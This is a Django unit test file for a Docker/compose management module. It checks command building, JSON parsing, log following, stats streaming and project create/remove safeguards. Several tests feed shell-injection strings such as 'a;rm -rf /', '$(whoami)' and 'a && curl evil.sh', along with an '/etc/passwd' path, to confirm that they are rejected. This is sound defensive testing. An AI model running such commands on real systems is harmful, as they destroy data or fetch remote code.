import json
import os
import tempfile
from types import SimpleNamespace
from unittest.mock import patch

from django.test import SimpleTestCase

from apps.docker.client import (
    DockerClientError,
    build_compose_command,
    find_name_conflicts,
    build_container_command,
    build_container_logs_follow_command,
    build_logs_follow_command,
    build_resource_command,
    build_stats_command,
    cache_key,
    iter_stats_frames,
    parse_docker_inspect,
    parse_inspect,
    parse_resource_list,
    save_config,
    create_project,
    remove_project,
    validate_project_ref,
)


class DockerResourceTests(SimpleTestCase):
    def test_list_images_parses_json_lines(self):
        output = (
            '{"ID":"sha256:aaa","Repository":"nginx","Tag":"alpine","Size":"23.4MB","CreatedSince":"2 days ago"}\n'
            '{"ID":"sha256:bbb","Repository":"<none>","Tag":"<none>","Size":"1.2GB","CreatedSince":"3 weeks ago"}\n'
        )

        self.assertEqual(parse_resource_list(output, 'images'), [
            {'id': 'sha256:aaa', 'name': 'nginx:alpine', 'size': '23.4MB',
             'created': '2 days ago', 'dangling': False},
            {'id': 'sha256:bbb', 'name': '<none>:<none>', 'size': '1.2GB',
             'created': '3 weeks ago', 'dangling': True},
        ])

    def test_list_networks_parses_json_lines(self):
        output = '{"ID":"n1","Name":"bridge","Driver":"bridge","Scope":"local"}\n'

        self.assertEqual(parse_resource_list(output, 'networks'), [
            {'id': 'n1', 'name': 'bridge', 'driver': 'bridge', 'scope': 'local'},
        ])

    def test_list_volumes_parses_json_lines(self):
        output = '{"Name":"data","Driver":"local","Mountpoint":"/var/lib/docker/volumes/data/_data"}\n'

        self.assertEqual(parse_resource_list(output, 'volumes'), [
            {'id': 'data', 'name': 'data', 'driver': 'local',
             'mountpoint': '/var/lib/docker/volumes/data/_data'},
        ])

    def test_build_resource_command_lists_with_json_format(self):
        self.assertEqual(
            build_resource_command('images', 'list'),
            'docker image ls --all --format {{json .}}'.replace('{{json .}}', "'{{json .}}'"))

    def test_build_resource_command_removes_named_target(self):
        self.assertEqual(
            build_resource_command('volumes', 'remove', 'my-data'),
            'docker volume rm -- my-data')

    def test_build_resource_command_prunes(self):
        self.assertEqual(
            build_resource_command('images', 'prune'),
            'docker image prune -f')

    def test_build_resource_command_rejects_unknown_kind_and_action(self):
        with self.assertRaises(DockerClientError):
            build_resource_command('secrets', 'list')
        with self.assertRaises(DockerClientError):
            build_resource_command('images', 'drop')

    def test_build_resource_command_requires_target_for_remove(self):
        with self.assertRaises(DockerClientError):
            build_resource_command('images', 'remove')

    def test_build_resource_command_rejects_shell_metacharacters_in_target(self):
        for value in ('a;rm -rf /', 'a b', '$(whoami)'):
            with self.subTest(value=value), self.assertRaises(DockerClientError):
                build_resource_command('volumes', 'remove', value)


class DockerClientTests(SimpleTestCase):
    def test_parse_inspect_groups_running_and_stopped_containers_by_compose_project(self):
        payload = [{
            'Name': '/demo-web-1',
            'Config': {
                'Image': 'demo:latest',
                'Labels': {
                    'com.docker.compose.project': 'demo',
                    'com.docker.compose.service': 'web',
                    'com.docker.compose.project.working_dir': '/opt/apps/demo',
                    'com.docker.compose.project.config_files': '/opt/apps/demo/compose.yaml',
                },
            },
            'State': {'Status': 'running'},
            'NetworkSettings': {'Ports': {'80/tcp': [{'HostIp': '0.0.0.0', 'HostPort': '8080'}]}},
        }, {
            'Name': '/demo-db-1',
            'Config': {
                'Image': 'postgres:16',
                'Labels': {
                    'com.docker.compose.project': 'demo',
                    'com.docker.compose.service': 'db',
                    'com.docker.compose.project.working_dir': '/opt/apps/demo',
                    'com.docker.compose.project.config_files': '/opt/apps/demo/compose.yaml',
                },
            },
            'State': {'Status': 'exited'},
            'NetworkSettings': {'Ports': {}},
        }]

        self.assertEqual(parse_docker_inspect(json.dumps(payload)), [{
            'name': 'demo',
            'workdir': '/opt/apps/demo',
            'config_file': '/opt/apps/demo/compose.yaml',
            'config_files': ['/opt/apps/demo/compose.yaml'],
            'containers': [{
                'name': 'demo-db-1', 'service': 'db', 'state': 'exited',
                'image': 'postgres:16', 'ports': [],
            }, {
                'name': 'demo-web-1', 'service': 'web', 'state': 'running',
                'image': 'demo:latest', 'ports': ['0.0.0.0:8080:80/tcp'],
            }],
        }])

    def test_parse_inspect_ignores_containers_not_created_by_compose(self):
        payload = [{
            'Name': '/standalone',
            'Config': {'Image': 'redis:7', 'Labels': {}},
            'State': {'Status': 'running'},
            'NetworkSettings': {'Ports': {}},
        }]

        self.assertEqual(parse_docker_inspect(json.dumps(payload)), [])

    def test_build_publish_uses_discovered_workdir_and_config_file(self):
        project = SimpleNamespace(
            name='demo', workdir='/opt/apps/demo', config_file='/opt/apps/demo/compose.yaml')

        self.assertEqual(
            build_compose_command(project, 'publish'),
            # 不带 --remove-orphans：否则会删除同项目名下不在本配置内的容器
            "cd /opt/apps/demo && docker compose -p demo -f /opt/apps/demo/compose.yaml pull "
            "&& docker compose -p demo -f /opt/apps/demo/compose.yaml up -d",
        )

    @patch('apps.docker.client._run_local', return_value=(0, ''))
    @patch('apps.docker.client.get_project')
    def test_save_config_preserves_existing_file_permissions(self, get_project, _run_local):
        with tempfile.TemporaryDirectory() as workdir:
            config_file = os.path.join(workdir, 'compose.yaml')
            with open(config_file, 'w', encoding='utf-8') as file:
                file.write('services: {}\n')
            os.chmod(config_file, 0o600)
            get_project.return_value = SimpleNamespace(
                name='demo', workdir=workdir, config_file=config_file,
                config_files=[config_file],
            )

            save_config(None, 'demo', config_file, 'services:\n  web:\n    image: nginx\n')

            self.assertEqual(os.stat(config_file).st_mode & 0o777, 0o600)

    @patch('apps.docker.client.discover_projects', return_value=[])
    @patch('apps.docker.client._run_local', side_effect=[(0, ''), (0, 'started')])
    def test_create_project_writes_compose_and_starts_it(self, run_local, _discover):
        with tempfile.TemporaryDirectory() as root:
            workdir = os.path.join(root, 'demo')
            content = 'services:\n  web:\n    image: nginx:alpine\n'

            result = create_project(None, 'demo', workdir, content)

            config_file = os.path.join(workdir, 'compose.yaml')
            with open(config_file, encoding='utf-8') as file:
                self.assertEqual(file.read(), content)
            self.assertEqual(result, {
                'name': 'demo', 'workdir': workdir, 'config_file': config_file,
                'output': 'started',
            })
            self.assertIn('config -q', run_local.call_args_list[0].args[0])
            self.assertIn('up -d', run_local.call_args_list[1].args[0])

    @patch('apps.docker.client.discover_projects', return_value=[])
    def test_create_project_does_not_overwrite_file_created_during_validation(self, _discover):
        with tempfile.TemporaryDirectory() as root:
            workdir = os.path.join(root, 'demo')
            config_file = os.path.join(workdir, 'compose.yaml')

            def run(command, _timeout):
                if 'config -q' in command:
                    with open(config_file, 'w', encoding='utf-8') as file:
                        file.write('external')
                return 0, ''

            with patch('apps.docker.client._run_local', side_effect=run):
                with self.assertRaisesRegex(DockerClientError, '已存在'):
                    create_project(None, 'demo', workdir, 'services: {}\n')

            with open(config_file, encoding='utf-8') as file:
                self.assertEqual(file.read(), 'external')

    @patch('apps.docker.client.discover_projects', return_value=[])
    @patch('apps.docker.client._run_local', side_effect=[
        (0, ''), (1, 'start failed'), (0, 'removed')])
    def test_create_project_runs_down_when_start_fails(self, run_local, _discover):
        with tempfile.TemporaryDirectory() as root:
            with self.assertRaisesRegex(DockerClientError, 'start failed'):
                create_project(None, 'demo', os.path.join(root, 'demo'), 'services: {}\n')

            self.assertIn('down', run_local.call_args_list[2].args[0])
        self.assertNotIn('--remove-orphans', run_local.call_args_list[2].args[0])

    def test_cache_key_is_scoped_to_host(self):
        self.assertEqual(cache_key(7), 'spug:docker:inspect:v2:7')
        self.assertEqual(cache_key(None), 'spug:docker:inspect:v2:local')


class DockerStandaloneTests(SimpleTestCase):
    """覆盖 dgx221 上的真实形态：1 个 compose 项目 + 4 个非 compose 容器。"""

    @staticmethod
    def _item(name, labels, state='running', image='img'):
        return {'Name': f'/{name}', 'State': {'Status': state},
                'Config': {'Image': image, 'Labels': labels}}

    def setUp(self):
        self.output = json.dumps([
            self._item('fun-asr-nano', {
                'com.docker.compose.project': 'app',
                'com.docker.compose.service': 'fun-asr-nano',
                'com.docker.compose.project.working_dir': '/home/jks003/fun-asr-nano/app',
                'com.docker.compose.project.config_files': '/home/jks003/fun-asr-nano/app/compose.yaml',
            }),
            # docker run 起的裸容器，完全没有 compose 标签
            self._item('vllm-qwen3.8-27b-fp8', {'maintainer': 'x'}),
            # 标签残缺：有 project/service 但没有 config_files，无法定位配置
            self._item('tei-bge-m3', {
                'com.docker.compose.project': 'app',
                'com.docker.compose.service': 'fun-asr-nano',
            }),
            self._item('qwen35-4b', {}, state='exited'),
        ])

    def test_only_full_labeled_container_becomes_project(self):
        payload = parse_inspect(self.output)

        self.assertEqual(len(payload['projects']), 1)
        self.assertEqual(payload['projects'][0]['name'], 'app')
        self.assertEqual([c['name'] for c in payload['projects'][0]['containers']],
                         ['fun-asr-nano'])

    def test_unmanaged_containers_are_listed_as_standalone(self):
        payload = parse_inspect(self.output)

        self.assertEqual([c['name'] for c in payload['standalone']],
                         ['qwen35-4b', 'tei-bge-m3', 'vllm-qwen3.8-27b-fp8'])
        by_name = {c['name']: c for c in payload['standalone']}
        # 残缺标签要标出来，方便运维回头清理
        self.assertTrue(by_name['tei-bge-m3']['partial_labels'])
        self.assertEqual(by_name['tei-bge-m3']['project'], 'app')
        self.assertFalse(by_name['vllm-qwen3.8-27b-fp8']['partial_labels'])
        self.assertEqual(by_name['qwen35-4b']['state'], 'exited')

    def test_parse_docker_inspect_keeps_returning_projects_only(self):
        self.assertEqual(parse_docker_inspect(self.output),
                         parse_inspect(self.output)['projects'])

    def test_container_command_is_limited_and_quoted(self):
        self.assertEqual(build_container_command('restart', 'tei-bge-m3'),
                         'docker restart -- tei-bge-m3')
        self.assertEqual(build_container_command('logs', 'tei-bge-m3', 5000),
                         'docker logs --tail 2000 -- tei-bge-m3')
        with self.assertRaises(DockerClientError):
            build_container_command('rm', 'tei-bge-m3')
        with self.assertRaises(DockerClientError):
            build_container_command('stop', 'a; rm -rf /')

    def test_remove_container_does_not_touch_volumes(self):
        command = build_container_command('remove', 'qwen35-4b')

        self.assertEqual(command, 'docker rm -f -- qwen35-4b')
        # 删卷不可逆且容易误伤共享数据，必须由「存储卷」页面单独操作
        self.assertNotIn('-v', command.replace('-- ', ''))
        self.assertNotIn('--volumes', command)


class DockerLogFollowTests(SimpleTestCase):
    PROJECT = SimpleNamespace(
        name='app', workdir='/srv/app',
        config_file='/srv/app/compose.yaml', config_files=['/srv/app/compose.yaml'])

    def test_compose_follow_command_includes_follow_and_tail(self):
        command = build_logs_follow_command(self.PROJECT, 'web', 500)

        self.assertIn('--follow', command)
        self.assertIn('--tail 500', command)
        self.assertTrue(command.endswith(' web'))
        self.assertIn('-p app -f /srv/app/compose.yaml', command)

    def test_compose_follow_without_service_covers_all(self):
        command = build_logs_follow_command(self.PROJECT)

        self.assertTrue(command.endswith('--tail 200'))

    def test_follow_tail_is_clamped(self):
        self.assertIn('--tail 2000', build_logs_follow_command(self.PROJECT, None, 99999))
        self.assertIn('--tail 20', build_logs_follow_command(self.PROJECT, None, 1))

    def test_container_follow_command_quotes_name(self):
        self.assertEqual(build_container_logs_follow_command('tei-bge-m3', 100),
                         'docker logs --follow --tail 100 -- tei-bge-m3')

    def test_long_running_wrapper_kills_child_when_stdin_closes(self):
        from apps.docker.client import _wrap_long_running

        wrapped = _wrap_long_running('docker logs --follow -- web', 3600)

        self.assertTrue(wrapped.startswith('timeout 3600s sh -c '))
        # channel 关闭 → stdin EOF → cat 返回 → kill 子进程，否则远端会挂满一小时
        self.assertIn('cat >/dev/null', wrapped)
        self.assertIn('kill -TERM $child', wrapped)

    def test_follow_commands_reject_injection(self):
        with self.assertRaises(DockerClientError):
            build_logs_follow_command(self.PROJECT, 'web; rm -rf /')
        with self.assertRaises(DockerClientError):
            build_container_logs_follow_command('a && curl evil.sh')


class DockerStatsTests(SimpleTestCase):
    LINE_A = ('{"BlockIO":"0B / 360kB","CPUPerc":"0.67%","Container":"web","ID":"aaa",'
              '"MemPerc":"6.99%","MemUsage":"547.4MiB / 7.653GiB","Name":"web",'
              '"NetIO":"8.03MB / 3.12MB","PIDs":"41"}')
    LINE_B = ('{"BlockIO":"14.4MB / 13.8MB","CPUPerc":"0.02%","Container":"db","ID":"bbb",'
              '"MemPerc":"3.11%","MemUsage":"244.1MiB / 7.653GiB","Name":"db",'
              '"NetIO":"49.2MB / 34.6MB","PIDs":"17"}')

    def test_build_stats_command_uses_stream_mode_and_quotes_names(self):
        command = build_stats_command(['web', 'db'])
        self.assertNotIn('--no-stream', command)
        self.assertTrue(command.endswith("'{{json .}}' web db"))

    def test_build_stats_command_rejects_invalid_container_name(self):
        with self.assertRaises(DockerClientError):
            build_stats_command(['web; rm -rf /'])

    def test_build_stats_command_rejects_empty_targets(self):
        with self.assertRaises(DockerClientError):
            build_stats_command([])

    def test_frames_strip_ansi_and_split_by_expected_count(self):
        lines = ['\x1b[H' + self.LINE_A, self.LINE_B + ' \x1b[K',
                 '\x1b[J\x1b[H' + self.LINE_A, self.LINE_B]

        frames = list(iter_stats_frames(lines, expected=2))

        self.assertEqual(len(frames), 2)
        self.assertEqual(sorted(frames[0]), ['db', 'web'])
        self.assertEqual(frames[0]['web'], {
            'cpu': '0.67%', 'mem': '547.4MiB / 7.653GiB', 'mem_percent': '6.99%',
            'net': '8.03MB / 3.12MB', 'block': '0B / 360kB', 'pids': '41'})

    def test_frames_split_on_duplicate_name_when_container_disappears(self):
        # 期望 2 个容器但 db 已消失，靠重名规则仍要按帧切分，不能一直攒着
        frames = list(iter_stats_frames([self.LINE_A, self.LINE_A, self.LINE_A], expected=2))

        self.assertEqual(len(frames), 3)
        self.assertEqual(list(frames[0]), ['web'])

    def test_frames_ignore_noise_lines(self):
        frames = list(iter_stats_frames(
            ['', 'CONTAINER  CPU %', 'not json', self.LINE_A], expected=1))

        self.assertEqual(len(frames), 1)
        self.assertEqual(list(frames[0]), ['web'])

    @patch('apps.docker.client._run_local', return_value=(0, 'removed'))
    def test_remove_project_runs_down_with_volumes_and_keeps_config(self, run_local):
        with tempfile.TemporaryDirectory() as workdir:
            config_file = os.path.join(workdir, 'compose.yaml')
            with open(config_file, 'w', encoding='utf-8') as file:
                file.write('services: {}\n')

            project = {'name': 'demo', 'workdir': workdir, 'config_file': config_file,
                       'config_files': [config_file], 'containers': []}
            with patch('apps.docker.client.discover_projects', return_value=[project]):
                result = remove_project(None, 'demo', config_file, delete_files=False)

            # --remove-orphans 会删除同项目名下不在本配置内的容器，必须不出现
            self.assertIn('down --volumes', run_local.call_args.args[0])
            self.assertNotIn('--remove-orphans', run_local.call_args.args[0])
            self.assertTrue(os.path.exists(config_file))
            self.assertEqual(result['output'], 'removed')

    @patch('apps.docker.client._run_local')
    def test_remove_project_rejects_duplicate_project_name(self, run_local):
        """同名但配置不同的项目共享 compose 作用域，删除必须中止。

        回归用例：曾出现「删除已停止的项目，把同名的另一个运行中项目一并删除」。
        """
        with tempfile.TemporaryDirectory() as workdir:
            mine = os.path.join(workdir, 'a', 'compose.yaml')
            other = os.path.join(workdir, 'b', 'compose.yaml')
            projects = [
                {'name': 'new-api', 'workdir': os.path.join(workdir, 'a'),
                 'config_file': mine, 'config_files': [mine],
                 'containers': [{'name': 'newapi-old'}]},
                {'name': 'new-api', 'workdir': os.path.join(workdir, 'b'),
                 'config_file': other, 'config_files': [other],
                 'containers': [{'name': 'newapi-new'}]},
            ]
            with patch('apps.docker.client.discover_projects', return_value=projects):
                with self.assertRaises(DockerClientError) as ctx:
                    remove_project(None, 'new-api', mine)
            self.assertIn('同名', str(ctx.exception))
            self.assertIn('newapi-new', str(ctx.exception))
            run_local.assert_not_called()

    def test_find_name_conflicts_ignores_same_config(self):
        projects = [
            {'name': 'demo', 'workdir': '/opt/a', 'config_file': '/opt/a/compose.yaml',
             'config_files': ['/opt/a/compose.yaml'], 'containers': []},
            {'name': 'other', 'workdir': '/opt/b', 'config_file': '/opt/b/compose.yaml',
             'config_files': ['/opt/b/compose.yaml'], 'containers': []},
        ]
        self.assertEqual(
            find_name_conflicts(projects, 'demo', '/opt/a/compose.yaml'), [])

    @patch('apps.docker.client._run_local', return_value=(0, 'removed'))
    def test_remove_project_can_delete_compose_file(self, _run_local):
        with tempfile.TemporaryDirectory() as workdir:
            config_file = os.path.join(workdir, 'compose.yaml')
            with open(config_file, 'w', encoding='utf-8') as file:
                file.write('services: {}\n')

            project = {'name': 'demo', 'workdir': workdir, 'config_file': config_file,
                       'config_files': [config_file], 'containers': []}
            with patch('apps.docker.client.discover_projects', return_value=[project]):
                remove_project(None, 'demo', config_file, delete_files=True)

            self.assertFalse(os.path.exists(config_file))

    @patch('apps.docker.client.discover_projects', return_value=[{
        'name': 'demo', 'workdir': '/opt/old', 'config_file': '/opt/old/compose.yaml',
    }])
    def test_create_project_rejects_existing_project_name(self, _discover):
        with tempfile.TemporaryDirectory() as root:
            with self.assertRaisesRegex(DockerClientError, '项目名称已存在'):
                create_project(None, 'demo', os.path.join(root, 'new'), 'services: {}\n')

    @patch('apps.docker.client.discover_projects', return_value=[])
    def test_create_project_rejects_existing_compose_file(self, _discover):
        with tempfile.TemporaryDirectory() as workdir:
            with open(os.path.join(workdir, 'compose.yaml'), 'w', encoding='utf-8') as file:
                file.write('services: {}\n')

            with self.assertRaises(DockerClientError):
                create_project(None, 'demo', workdir, 'services: {}\n')

    def test_validate_project_ref_rejects_client_path_not_present_in_discovery(self):
        projects = [{
            'name': 'demo', 'workdir': '/opt/apps/demo',
            'config_file': '/opt/apps/demo/compose.yaml', 'containers': [],
        }]

        with self.assertRaises(DockerClientError):
            validate_project_ref(projects, 'demo', '/etc/passwd')
